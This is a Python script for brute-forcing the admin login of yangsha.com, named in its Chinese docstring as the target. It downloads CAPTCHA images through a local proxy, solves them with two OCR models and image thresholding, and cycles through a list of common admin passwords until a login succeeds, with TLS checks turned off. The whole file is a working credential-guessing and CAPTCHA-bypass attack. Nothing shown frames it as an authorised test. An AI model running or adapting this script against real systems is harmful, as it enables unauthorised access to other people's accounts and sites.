#!/usr/bin/env python3
"""yangsha_bf3.py - yangsha.com 最终爆破
getcap.php(81.70下载BMP验证码) -> 165 ddddocr -> loginpost.php(81.70提交)
"""
import urllib.request, ssl, re, sys, time, io, base64
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
GETCAP = 'http://127.0.0.1:13080/getcap.php'
CAPIMG = 'http://127.0.0.1:13080/ys_cap.jpg'
LOGIN = 'http://127.0.0.1:13080/loginpost.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "yangsha", "yangsha123", "yzdf", "123456789"]

def get_captcha():
    """触发getcap下载+拉取BMP"""
    try:
        r = urllib.request.urlopen(urllib.request.Request(GETCAP, headers=UA), timeout=20, context=ctx)
        out = r.read(5000).decode('utf-8', 'ignore')
        if 'SAVED:' not in out:
            return None
        r2 = urllib.request.urlopen(urllib.request.Request(CAPIMG, headers=UA), timeout=15, context=ctx)
        return r2.read()
    except Exception:
        return None

def do_login(pw, code):
    url = LOGIN + '?p=' + urllib.parse.quote(pw) + '&c=' + code
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20, context=ctx)
        return r.read(30000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.read(30000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:60]

def main():
    import urllib.parse
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
    for pw in PASSWORDS:
        for attempt in range(8):
            img = get_captcha()
            if not img:
                print('cap fail %s' % pw, flush=True)
                time.sleep(3)
                continue
            c1 = ocr.classification(img)
            try:
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 120 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception:
                c2 = c1
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            resp = do_login(pw, code)
            if '验证码' in resp:
                continue
            if '错误' in resp or '失败' in resp or '密码' in resp:
                print('pw-wrong %s (cap=%s)' % (pw, code), flush=True)
                time.sleep(2)
                break
            if '管理' in resp or '欢迎' in resp or 'logout' in resp.lower():
                print('!!! HIT: admin/%s cap=%s' % (pw, code), flush=True)
                sys.exit(0)
            print('CHECK %s: %s' % (pw, resp[:80].replace(chr(10), ' ')), flush=True)
            time.sleep(2)
            break
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
